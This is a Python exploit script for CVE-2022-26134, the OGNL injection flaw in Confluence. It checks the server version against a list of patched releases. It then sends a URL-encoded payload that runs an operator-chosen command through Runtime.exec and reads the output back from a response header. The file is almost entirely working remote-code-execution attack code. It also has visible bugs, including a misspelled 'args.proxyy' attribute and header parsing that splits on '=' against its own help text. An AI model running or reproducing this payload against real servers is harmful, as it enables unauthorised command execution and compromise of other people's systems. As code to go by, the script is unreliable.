#!/usr/bin/env python3
import re
import requests
import argparse

# Global variable for the args
args = None

def parse_args() -> argparse.Namespace:
    """
    Returns the parsed arguments passed in via argparse
    Required arguments are marked by a star (*)

    @return: the parsed args
    """

    # Add some default checks 
    parser = argparse.ArgumentParser(description="CVE-2022-26134 exploit script by cc3305")
    parser.add_argument("URL", action="store", help="Target url")
    parser.add_argument("-f", "--force", action="store_true", help="Force the exploit (skip the check if the host is vulnerable)")
    parser.add_argument("-x", "--proxy", action="store", help="HTTP proxy in the format http://127.0.0.1:8080")
    parser.add_argument("-H", "--headers", action="append", help="Request Headers in the format `\"Header-Name: Header-Value\"`. Multiple -H flags are allowed")
    parser.add_argument("-c", "--cookie", action="store", help="Cookie data in the format `\"COOKIE1=VALUE1; COOKIE2=VALUE2\"`")

    # Add more checks according to exploit, e.g. add a "--command" for a RCE exploit
    parser.add_argument("-C", "--command", action="store", help="* Command to run on the target if exploited successfully")
    
    # Return the parsed args
    result = parser.parse_args()

    # Bring the proxy, cookies and headers into a pythonic format
    result.proxy = {"http": result.proxy, "https": result.proxy}
    

    headers = {}
    if(result.headers != None):
        for header in result.headers:
            try:
                header_parts = header.split("=")
                headers[header_parts[0]] = header_parts[1]
            except:
                continue
    result.headers = headers

    cookies = {}
    if(result.cookie != None):
        for cookie in result.cookie.split(";"):
            try:
                cookie_parts = cookie.split("=")
                cookies[cookie_parts[0]] = cookie_parts[1]
            except:
                continue
    result.cookie = cookies


    # Check if the required flags are set
    if(result.command):
        return result

    # If not print the help and exit
    print("Not all required arguments are set, required arguments are marked by a star(*)")
    parser.print_help()
    exit()

def check_vulnerable():
    """
    Check if the target is vulnerable
    If there is no way to determine if the host is vulnerable just return
    If the host is not vulnerable exit and print a error message, otherwise just return

    This check only does a blacklist check so might not be a 100% accurate
    """

    patched_versions = ["1.3.0", "7.4.17", "7.13.7", "7.14.3", "7.15.2", "7.16.4", "7.17.4", "7.18.1"]

    # Get the version from the footer and compare it to the patched version
    r = requests.get(f"{args.URL}/login.action", verify=False, proxies=args.proxy, headers=args.headers, cookies=args.cookie)
    if(r.status_code == 200):
        regex_version = re.search(r"<span id='footer-build-information'>(.*)<\/span>", r.text, re.MULTILINE)
        if(regex_version):
            version = regex_version.groups()[0]
            if(version not in patched_versions):
                print(f"Version {version} seems to be vulnerable.")
                return True
        else:
            print(f"Version could not be determined, if you are sure you the target is vulnerable try --force")
    else:
        print(f"Could not lookup version, if you are sure you the target is vulnerable try --force")

    exit(0)

def run_exploit():
    """
    Make a request to the webserver with a specifically crafted payload to execute code and return the output in the response headers
    """

    response = requests.get(f"{args.URL}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{args.command}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/", verify=False, allow_redirects=False, proxies=args.proxyy, headers=args.headers, cookies=args.cookie)
    
    if(response.status_code == 302):
        output = response.headers['X-Cmd-Response']
        print(f"Command `{args.command}` returned:\n{output}")
    else:
        print(f"Something went wrong!")

    return

# Entrypoint, this gets executed first
if __name__ == "__main__":
    args = parse_args()
    if not args.force:
        check_vulnerable()
    run_exploit()


